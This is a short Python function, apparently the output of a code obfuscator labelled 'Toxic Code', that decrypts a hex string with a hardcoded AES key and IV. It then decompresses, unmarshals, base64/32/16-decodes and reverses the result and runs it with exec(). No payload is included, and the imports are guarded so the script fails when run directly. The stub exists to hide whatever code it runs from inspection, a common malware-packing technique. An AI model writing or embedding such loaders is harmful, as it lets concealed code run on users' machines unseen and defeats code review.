def Run(Code):
    key = 'TC'
    iv = 'Toxic Code'
    code = Code.encode('utf-8')
    cipher = b16decode(code)
    crypt = AES.new(b'\x9bm\x9a\xef\x1f3&\x0c\xb2\xc7\xbd\x8e\xc7>\xb9\x04',AES.MODE_OFB,b'\xabw\x95\x17\xbav\xf1\x94tru<\xf29\xc7j')
    cipher = crypt.decrypt(cipher)
    cipher = decompress(cipher)
    cipher = loads(cipher)
    cipher = b64decode(cipher)
    cipher = b32decode(cipher)
    cipher = b16decode(cipher).decode('utf-8')
    cipher = "".join(reversed(cipher))
    exec(cipher)
if __name__ != '__main__':
    from base64 import *
    from marshal import dumps,loads
    from zlib import compress,decompress
    from Crypto.Cipher import AES
